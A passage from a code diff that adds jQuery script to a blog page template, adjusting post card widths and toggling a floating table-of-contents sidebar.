+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
     
 
 </main>
